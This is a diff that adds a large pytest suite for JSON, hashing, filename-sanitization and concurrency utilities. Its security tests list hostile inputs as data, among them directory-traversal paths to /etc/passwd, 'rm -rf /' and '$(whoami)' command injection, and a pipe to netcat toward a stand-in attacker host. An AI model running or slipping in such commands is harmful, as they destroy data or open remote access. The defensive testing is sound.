@@ -1449,3 +1449,700 @@ pytest.mark.slow = pytest.mark.skipif(
     not pytest.config.getoption("--run-slow", default=False),
     reason="Slow tests skipped unless --run-slow option provided"
 )
+
+
+# Additional Comprehensive Security and Edge Case Tests
+class TestSecurityAndValidationEnhancements:
+    """Security-focused tests and additional validation scenarios"""
+    
+    def test_safe_json_parse_injection_resistance(self):
+        """Test JSON parser resistance to various injection attempts"""
+        injection_attempts = [
+            '{"__proto__": {"polluted": true}}',  # Prototype pollution
+            '{"constructor": {"prototype": {"polluted": true}}}',
+            '{"eval": "malicious_code()"}',
+            '{"require": "fs"}',
+            '{"process": {"exit": 1}}',
+            '{"\u0000": "null_byte_key"}',
+            '{"\\u0000": "unicode_null"}',
+        ]
+        
+        for malicious_json in injection_attempts:
+            result = safe_json_parse(malicious_json)
+            if result is not None:
+                # If parsed, ensure it doesn't contain dangerous patterns
+                assert not hasattr(result, '__proto__')
+                assert not hasattr(result, 'constructor')
+                # Should be safe dictionary data only
+                assert isinstance(result, (dict, list, str, int, float, bool))
+    
+    def test_safe_json_parse_dos_resistance(self):
+        """Test JSON parser resistance to denial of service attacks"""
+        # Test with deeply nested arrays (billion laughs style)
+        nested_arrays = "[[[[" * 1000 + "null" + "]]]]" * 1000
+        result = safe_json_parse(nested_arrays)
+        # Should either parse safely or return None, not crash
+        assert result is None or isinstance(result, list)
+        
+        # Test with very wide objects
+        wide_object = "{" + ",".join(f'"key_{i}": {i}' for i in range(10000)) + "}"
+        result = safe_json_parse(wide_object)
+        assert result is None or isinstance(result, dict)
+    
+    def test_safe_json_dumps_sensitive_data_handling(self):
+        """Test JSON serialization with potentially sensitive data"""
+        sensitive_data = {
+            "password": "secret123",
+            "api_key": "sk-1234567890abcdef",
+            "credit_card": "4111-1111-1111-1111",
+            "ssn": "123-45-6789",
+            "email": "user@example.com",
+            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvg...",
+        }
+        
+        result = safe_json_dumps(sensitive_data)
+        # Should serialize but we verify it's handled as expected
+        assert result != ""
+        # In production, you might want to redact sensitive fields
+        parsed_back = safe_json_parse(result)
+        assert parsed_back == sensitive_data  # For now, no redaction
+    
+    def test_generate_hash_cryptographic_properties(self):
+        """Test hash function for cryptographic security properties"""
+        # Test entropy of generated hashes
+        test_inputs = [f"input_{i}" for i in range(1000)]
+        hashes = [generate_hash(inp) for inp in test_inputs]
+        
+        # Check for good bit distribution
+        bit_counts = [0] * 256  # For each bit position
+        for hash_val in hashes[:100]:  # Sample to avoid performance issues
+            hash_int = int(hash_val, 16)
+            for i in range(256):
+                if (hash_int >> i) & 1:
+                    bit_counts[i] += 1
+        
+        # Each bit position should appear roughly 50% of the time
+        for count in bit_counts:
+            assert 30 <= count <= 70  # Allow reasonable variance
+    
+    def test_sanitize_filename_security_comprehensive(self):
+        """Comprehensive security tests for filename sanitization"""
+        malicious_filenames = [
+            "../../../etc/passwd",  # Directory traversal
+            "..\\..\\..\\windows\\system32\\config\\sam",  # Windows traversal
+            "file\x00.txt\x00.exe",  # Null byte injection
+            "\x2e\x2e\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64",  # Encoded traversal
+            "CON", "PRN", "AUX", "NUL",  # Windows reserved names
+            "COM1", "COM2", "LPT1", "LPT2",  # More Windows reserved
+            "file\r\n.txt",  # CRLF injection
+            "file<script>alert('xss')</script>.txt",  # XSS attempt
+            "file`rm -rf /`.txt",  # Command injection attempt
+            "file$(whoami).txt",  # Command substitution
+            "file|nc attacker.com 4444.txt",  # Pipe injection
+        ]
+        
+        for malicious_name in malicious_filenames:
+            sanitized = sanitize_filename(malicious_name)
+            
+            # Should not contain path separators
+            assert "/" not in sanitized
+            assert "\\" not in sanitized
+            assert ".." not in sanitized
+            
+            # Should not contain control characters
+            assert all(ord(c) >= 32 for c in sanitized if c != '\t')
+            
+            # Should not be empty or just whitespace
+            assert sanitized.strip() != ""
+            
+            # Should not be a reserved name
+            reserved_names = ["CON", "PRN", "AUX", "NUL", "COM1", "COM2", "LPT1", "LPT2"]
+            assert sanitized.upper() not in reserved_names
+
+
+class TestConcurrencyAndThreadSafety:
+    """Test utility functions under concurrent access"""
+    
+    def test_concurrent_hash_generation(self):
+        """Test hash generation under concurrent access"""
+        import threading
+        import concurrent.futures
+        
+        inputs = [f"concurrent_test_{i}" for i in range(100)]
+        
+        def generate_hashes_batch(input_batch):
+            return [generate_hash(inp) for inp in input_batch]
+        
+        # Split inputs among threads
+        batch_size = 10
+        input_batches = [inputs[i:i+batch_size] for i in range(0, len(inputs), batch_size)]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            future_results = [executor.submit(generate_hashes_batch, batch) for batch in input_batches]
+            all_results = []
+            for future in concurrent.futures.as_completed(future_results):
+                all_results.extend(future.result())
+        
+        # Verify all hashes are correct and unique per input
+        expected_hashes = [generate_hash(inp) for inp in inputs]
+        assert len(all_results) == len(expected_hashes)
+        
+        # Results should be deterministic regardless of threading
+        for i, expected in enumerate(expected_hashes):
+            assert expected in all_results
+    
+    def test_concurrent_json_operations(self):
+        """Test JSON operations under concurrent access"""
+        import threading
+        
+        test_data = [
+            {"thread": i, "data": [j for j in range(10)], "nested": {"value": i * 10}}
+            for i in range(50)
+        ]
+        
+        results = []
+        errors = []
+        
+        def json_round_trip(data):
+            try:
+                # Serialize
+                json_str = safe_json_dumps(data)
+                if not json_str:
+                    errors.append("Serialization failed")
+                    return
+                
+                # Parse back
+                parsed = safe_json_parse(json_str)
+                if parsed is None:
+                    errors.append("Parsing failed")
+                    return
+                
+                results.append(parsed)
+            except Exception as e:
+                errors.append(str(e))
+        
+        # Run concurrent JSON operations
+        threads = []
+        for data in test_data:
+            thread = threading.Thread(target=json_round_trip, args=(data,))
+            threads.append(thread)
+            thread.start()
+        
+        for thread in threads:
+            thread.join()
+        
+        # Verify results
+        assert len(errors) == 0, f"Errors occurred: {errors}"
+        assert len(results) == len(test_data)
+    
+    def test_concurrent_file_operations(self):
+        """Test file operations under concurrent access"""
+        import tempfile
+        import threading
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            base_path = Path(temp_dir)
+            created_dirs = []
+            errors = []
+            
+            def create_directory_structure(thread_id):
+                try:
+                    # Each thread creates its own subdirectory structure
+                    thread_dir = ensure_directory_exists(base_path / f"thread_{thread_id}")
+                    nested_dir = ensure_directory_exists(thread_dir / "nested" / "deep")
+                    
+                    # Create files with sanitized names
+                    filename = sanitize_filename(f"file_{thread_id}<>?.txt")
+                    file_path = nested_dir / filename
+                    file_path.write_text(f"Content from thread {thread_id}")
+                    
+                    created_dirs.append((thread_id, thread_dir, file_path))
+                except Exception as e:
+                    errors.append((thread_id, str(e)))
+            
+            # Run 20 concurrent file operations
+            threads = []
+            for i in range(20):
+                thread = threading.Thread(target=create_directory_structure, args=(i,))
+                threads.append(thread)
+                thread.start()
+            
+            for thread in threads:
+                thread.join()
+            
+            # Verify results
+            assert len(errors) == 0, f"Errors: {errors}"
+            assert len(created_dirs) == 20
+            
+            # Verify all directories and files exist
+            for thread_id, thread_dir, file_path in created_dirs:
+                assert thread_dir.exists()
+                assert file_path.exists()
+                content = file_path.read_text()
+                assert f"thread {thread_id}" in content
+
+
+class TestMemoryEfficiencyAndPerformance:
+    """Test memory efficiency and performance characteristics"""
+    
+    def test_large_data_structure_handling(self):
+        """Test utilities with very large data structures"""
+        # Create large nested structure
+        large_data = {}
+        for i in range(100):
+            large_data[f"section_{i}"] = {
+                f"subsection_{j}": {
+                    "items": [f"item_{k}" for k in range(100)],
+                    "metadata": {"id": f"{i}_{j}", "size": 100}
+                }
+                for j in range(50)
+            }
+        
+        # Test JSON serialization performance
+        import time
+        start_time = time.time()
+        json_result = safe_json_dumps(large_data)
+        json_time = time.time() - start_time
+        
+        # Test flattening performance  
+        start_time = time.time()
+        flat_result = flatten_dict(large_data)
+        flatten_time = time.time() - start_time
+        
+        # Test hash generation performance
+        start_time = time.time()
+        hash_result = generate_hash(json_result)
+        hash_time = time.time() - start_time
+        
+        # Verify operations completed successfully
+        assert json_result != ""
+        assert len(flat_result) == 100 * 50 * 3  # sections * subsections * (items, metadata.id, metadata.size)
+        assert len(hash_result) == 64
+        
+        # Performance should be reasonable (adjust based on hardware)
+        assert json_time < 5.0, f"JSON serialization too slow: {json_time}s"
+        assert flatten_time < 5.0, f"Flattening too slow: {flatten_time}s"
+        assert hash_time < 2.0, f"Hashing too slow: {hash_time}s"
+    
+    def test_memory_usage_chunking(self):
+        """Test memory efficiency of chunking operations"""
+        # Create large list
+        large_list = list(range(100000))
+        
+        # Test chunking doesn't create excessive copies
+        chunks = chunk_list(large_list, 1000)
+        
+        # Verify chunks reference original data
+        assert chunks[0][0] is large_list[0]
+        assert chunks[50][500] is large_list[50500]
+        
+        # Test with large objects
+        class LargeObject:
+            def __init__(self, data):
+                self.data = data
+        
+        large_objects = [LargeObject(f"data_{i}" * 100) for i in range(1000)]
+        object_chunks = chunk_list(large_objects, 100)
+        
+        # Verify objects aren't copied
+        assert object_chunks[0][0] is large_objects[0]
+        assert object_chunks[5][50] is large_objects[550]
+    
+    def test_retry_mechanism_efficiency(self):
+        """Test retry mechanism efficiency and backoff behavior"""
+        call_times = []
+        
+        def time_tracking_function():
+            call_times.append(time.time())
+            if len(call_times) < 4:
+                raise ConnectionError("Temporary failure")
+            return "success"
+        
+        start_time = time.time()
+        result = retry_with_backoff(time_tracking_function, max_retries=5, base_delay=0.1)
+        total_time = time.time() - start_time
+        
+        assert result == "success"
+        assert len(call_times) == 4
+        
+        # Verify exponential backoff timing
+        for i in range(1, len(call_times)):
+            time_diff = call_times[i] - call_times[i-1]
+            expected_min_delay = 0.1 * (2 ** (i-1))
+            # Allow some tolerance for timing variations
+            assert time_diff >= expected_min_delay * 0.8
+
+
+class TestDataValidationAndSanitization:
+    """Test data validation and sanitization edge cases"""
+    
+    def test_json_with_invalid_unicode(self):
+        """Test JSON handling with invalid unicode sequences"""
+        invalid_unicode_cases = [
+            '{"invalid": "\\uD800"}',  # Unpaired surrogate
+            '{"invalid": "\\uDFFF"}',  # Invalid surrogate
+            '{"invalid": "\\u0000"}',  # Null character
+            '{"mixed": "valid\\u0041invalid\\uD800"}',  # Mixed valid/invalid
+        ]
+        
+        for case in invalid_unicode_cases:
+            result = safe_json_parse(case)
+            # Should either parse correctly or fail gracefully
+            if result is not None:
+                assert isinstance(result, dict)
+    
+    def test_hash_with_various_encodings(self):
+        """Test hash generation with different text encodings"""
+        test_strings = [
+            "simple ascii",
+            "café français",  # UTF-8 with accents
+            "日本語",  # Japanese
+            "🚀🌟💻",  # Emoji
+            "مرحبا",  # Arabic RTL
+            "Ελληνικά",  # Greek
+        ]
+        
+        hashes = []
+        for text in test_strings:
+            # Test with string input
+            hash_str = generate_hash(text)
+            assert len(hash_str) == 64
+            hashes.append(hash_str)
+            
+            # Test with bytes input (UTF-8 encoded)
+            hash_bytes = generate_hash(text.encode('utf-8'))
+            assert len(hash_bytes) == 64
+            
+            # String and bytes versions should be the same
+            assert hash_str == hash_bytes
+        
+        # All hashes should be different
+        assert len(set(hashes)) == len(hashes)
+    
+    def test_dictionary_merging_type_safety(self):
+        """Test dictionary merging maintains type safety"""
+        # Test merging with incompatible types
+        dict1 = {
+            "string_val": "hello",
+            "int_val": 42,
+            "list_val": [1, 2, 3],
+            "dict_val": {"nested": "value"},
+            "bool_val": True,
+            "none_val": None,
+        }
+        
+        dict2 = {
+            "string_val": 123,  # int replaces string
+            "int_val": "world",  # string replaces int  
+            "list_val": {"key": "value"},  # dict replaces list
+            "dict_val": [4, 5, 6],  # list replaces dict
+            "bool_val": "false",  # string replaces bool
+            "none_val": {"not": "none"},  # dict replaces None
+        }
+        
+        result = merge_dicts(dict1, dict2)
+        
+        # dict2 values should take precedence
+        assert result["string_val"] == 123
+        assert result["int_val"] == "world"
+        assert result["list_val"] == {"key": "value"}
+        assert result["dict_val"] == [4, 5, 6]
+        assert result["bool_val"] == "false"
+        assert result["none_val"] == {"not": "none"}
+    
+    def test_filename_sanitization_edge_cases(self):
+        """Test filename sanitization with edge cases"""
+        edge_cases = [
+            ("", "unnamed"),
+            (".", "unnamed"),
+            ("..", "unnamed"), 
+            ("...", "unnamed"),
+            ("   ", "unnamed"),
+            ("\t\n\r", "unnamed"),
+            ("file.txt.", "file.txt"),  # Trailing dot
+            (".file.txt", "file.txt"),  # Leading dot
+            ("..file..txt..", "file..txt"),  # Multiple dots
+            ("file" + "\u200b" + "name.txt", "file_name.txt"),  # Zero-width space
+            ("file\u0001\u0002\u0003.txt", "file___.txt"),  # Control characters
+        ]
+        
+        for input_name, expected in edge_cases:
+            result = sanitize_filename(input_name)
+            assert result == expected, f"Expected {expected}, got {result} for input {repr(input_name)}"
+
+
+class TestRealWorldIntegrationScenarios:
+    """Test real-world integration scenarios"""
+    
+    def test_log_processing_pipeline(self):
+        """Test complete log processing pipeline"""
+        # Simulate log entries
+        log_entries = [
+            '{"timestamp": "2023-01-01T10:00:00Z", "level": "INFO", "message": "Server started", "metadata": {"pid": 1234}}',
+            '{"timestamp": "2023-01-01T10:01:00Z", "level": "ERROR", "message": "Database connection failed", "error": {"code": 500, "details": "Connection timeout"}}',
+            'invalid log entry that is not json',
+            '{"timestamp": "2023-01-01T10:02:00Z", "level": "DEBUG", "message": "Processing request", "request": {"id": "req_123", "user": {"id": 456, "role": "admin"}}}',
+        ]
+        
+        processed_logs = []
+        
+        for entry in log_entries:
+            # Parse log entry
+            parsed_log = safe_json_parse(entry)
+            if parsed_log is None:
+                continue
+            
+            # Flatten nested structures for indexing
+            flat_log = flatten_dict(parsed_log)
+            
+            # Generate unique ID for deduplication
+            log_id = generate_hash(entry)[:12]
+            
+            # Sanitize message for filename if needed
+            if "message" in parsed_log:
+                safe_message = sanitize_filename(parsed_log["message"])
+                flat_log["safe_message"] = safe_message
+            
+            # Add processing metadata
+            processing_info = {
+                "processed_at": time.time(),
+                "log_id": log_id,
+                "original_size": len(entry)
+            }
+            
+            # Merge with processing info
+            final_log = merge_dicts(flat_log, processing_info)
+            processed_logs.append(final_log)
+        
+        # Verify processing
+        assert len(processed_logs) == 3  # 3 valid JSON entries
+        
+        # Check required fields
+        for log in processed_logs:
+            assert "log_id" in log
+            assert "processed_at" in log
+            assert "timestamp" in log
+            assert len(log["log_id"]) == 12
+    
+    def test_configuration_management_system(self):
+        """Test configuration management system simulation"""
+        import tempfile
+        
+        # Simulate configuration hierarchy
+        base_config = {
+            "app": {"name": "MyApp", "version": "1.0.0"},
+            "database": {"host": "localhost", "port": 5432, "ssl": False},
+            "logging": {"level": "INFO", "format": "json"},
+            "features": {"auth": True, "metrics": True}
+        }
+        
+        environment_configs = {
+            "development": {
+                "database": {"host": "dev.db.local"},
+                "logging": {"level": "DEBUG"}
+            },
+            "staging": {
+                "database": {"host": "staging.db.local", "ssl": True},
+                "features": {"metrics": False}
+            },
+            "production": {
+                "database": {"host": "prod.db.local", "ssl": True, "pool_size": 20},
+                "logging": {"level": "WARN"},
+                "features": {"auth": True, "metrics": True, "analytics": True}
+            }
+        }
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            config_results = {}
+            
+            for env_name, env_config in environment_configs.items():
+                # Merge base with environment-specific config
+                merged_config = merge_dicts(base_config, env_config)
+                
+                # Flatten for environment variable export
+                flat_config = flatten_dict(merged_config)
+                
+                # Generate configuration hash for versioning
+                config_json = safe_json_dumps(merged_config)
+                config_hash = generate_hash(config_json)
+                
+                # Create environment-specific config directory
+                env_dir = ensure_directory_exists(Path(temp_dir) / "configs" / env_name)
+                
+                # Save configuration files
+                config_file = env_dir / "config.json"
+                config_file.write_text(config_json)
+                
+                env_file = env_dir / "environment.env"
+                env_vars = "\n".join(f"{k.upper().replace('.', '_')}={v}" for k, v in flat_config.items())
+                env_file.write_text(env_vars)
+                
+                config_results[env_name] = {
+                    "merged": merged_config,
+                    "flat": flat_config,
+                    "hash": config_hash,
+                    "files": [str(config_file), str(env_file)]
+                }
+            
+            # Verify results
+            assert len(config_results) == 3
+            
+            # Check environment-specific overrides
+            assert config_results["development"]["merged"]["logging"]["level"] == "DEBUG"
+            assert config_results["production"]["merged"]["database"]["ssl"] is True
+            assert config_results["staging"]["merged"]["features"]["metrics"] is False
+            
+            # Verify files were created
+            for env_result in config_results.values():
+                for file_path in env_result["files"]:
+                    assert Path(file_path).exists()
+    
+    def test_api_client_with_retry_and_caching(self):
+        """Test API client simulation with retry logic and caching"""
+        # Simulate API responses
+        api_responses = {
+            "/users/1": '{"id": 1, "name": "John Doe", "email": "john@example.com"}',
+            "/users/2": '{"id": 2, "name": "Jane Smith", "email": "jane@example.com"}',
+            "/posts/1": '{"id": 1, "title": "Hello World", "author": {"id": 1, "name": "John Doe"}}',
+            "/error": 'not valid json',
+        }
+        
+        # Simulate cache
+        cache = {}
+        
+        # Simulate failure conditions
+        failure_count = {"count": 0}
+        
+        def simulate_api_call(endpoint):
+            # Simulate intermittent failures
+            failure_count["count"] += 1
+            if failure_count["count"] % 5 == 0:  # Every 5th call fails
+                raise ConnectionError("API temporarily unavailable")
+            
+            if endpoint in api_responses:
+                return api_responses[endpoint]
+            else:
+                raise ValueError(f"Endpoint not found: {endpoint}")
+        
+        def cached_api_call(endpoint):
+            # Check cache first
+            cache_key = generate_hash(endpoint)[:16]
+            if cache_key in cache:
+                return cache[cache_key]
+            
+            # Make API call with retry
+            response = retry_with_backoff(
+                lambda: simulate_api_call(endpoint),
+                max_retries=3,
+                base_delay=0.01
+            )
+            
+            # Parse and cache response
+            parsed_response = safe_json_parse(response)
+            if parsed_response is not None:
+                cache[cache_key] = parsed_response
+                return parsed_response
+            else:
+                raise ValueError("Invalid JSON response")
+        
+        # Test API calls
+        test_endpoints = ["/users/1", "/users/2", "/posts/1", "/users/1"]  # Last one should hit cache
+        results = []
+        
+        for endpoint in test_endpoints:
+            try:
+                result = cached_api_call(endpoint)
+                results.append({"endpoint": endpoint, "data": result, "cached": len(cache) > 0})
+            except Exception as e:
+                results.append({"endpoint": endpoint, "error": str(e)})
+        
+        # Verify results
+        successful_results = [r for r in results if "data" in r]
+        assert len(successful_results) >= 3  # Most calls should succeed
+        
+        # Verify caching worked
+        assert len(cache) >= 2  # Should have cached responses
+        
+        # Verify duplicate call used cache
+        duplicate_calls = [r for r in results if r.get("endpoint") == "/users/1"]
+        assert len(duplicate_calls) == 2  # Called twice
+
+
+# Additional Performance Benchmarks
+class TestPerformanceBenchmarks:
+    """Performance benchmarks for utility functions"""
+    
+    @pytest.mark.slow
+    def test_hash_generation_performance(self):
+        """Benchmark hash generation performance"""
+        import time
+        
+        # Test with various input sizes
+        test_cases = [
+            ("small", "small input"),
+            ("medium", "medium input " * 100),
+            ("large", "large input " * 10000),
+        ]
+        
+        for case_name, test_input in test_cases:
+            start_time = time.time()
+            for _ in range(1000):  # 1000 iterations
+                generate_hash(test_input)
+            end_time = time.time()
+            
+            avg_time = (end_time - start_time) / 1000
+            print(f"Hash generation ({case_name}): {avg_time:.6f}s per operation")
+            
+            # Performance thresholds (adjust as needed)
+            if case_name == "small":
+                assert avg_time < 0.001  # < 1ms
+            elif case_name == "medium":
+                assert avg_time < 0.005  # < 5ms
+            elif case_name == "large":
+                assert avg_time < 0.050  # < 50ms
+    
+    @pytest.mark.slow  
+    def test_json_operations_performance(self):
+        """Benchmark JSON operations performance"""
+        import time
+        
+        # Create test data of various complexities
+        simple_data = {"key": "value", "number": 42}
+        complex_data = {
+            "users": [{"id": i, "data": {"nested": f"value_{i}"}} for i in range(100)],
+            "metadata": {"created": "2023-01-01", "complex": True}
+        }
+        
+        test_cases = [
+            ("simple", simple_data),
+            ("complex", complex_data),
+        ]
+        
+        for case_name, test_data in test_cases:
+            # Benchmark serialization
+            start_time = time.time()
+            for _ in range(1000):
+                safe_json_dumps(test_data)
+            serialize_time = (time.time() - start_time) / 1000
+            
+            # Benchmark parsing
+            json_str = safe_json_dumps(test_data)
+            start_time = time.time()
+            for _ in range(1000):
+                safe_json_parse(json_str)
+            parse_time = (time.time() - start_time) / 1000
+            
+            print(f"JSON serialize ({case_name}): {serialize_time:.6f}s per operation")
+            print(f"JSON parse ({case_name}): {parse_time:.6f}s per operation")
+            
+            # Performance thresholds
+            assert serialize_time < 0.010  # < 10ms
+            assert parse_time < 0.010  # < 10ms
+
+
+# Mark slow tests
+pytest.mark.slow = pytest.mark.skipif(
+    "not config.getoption('--run-slow', default=False)",
+    reason="Slow tests skipped unless --run-slow option provided"
+)
+
